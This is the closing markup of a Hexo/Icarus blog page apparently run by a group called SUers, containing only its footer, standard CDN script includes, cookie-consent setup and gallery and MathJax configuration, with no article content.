height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><!--!--></body></html>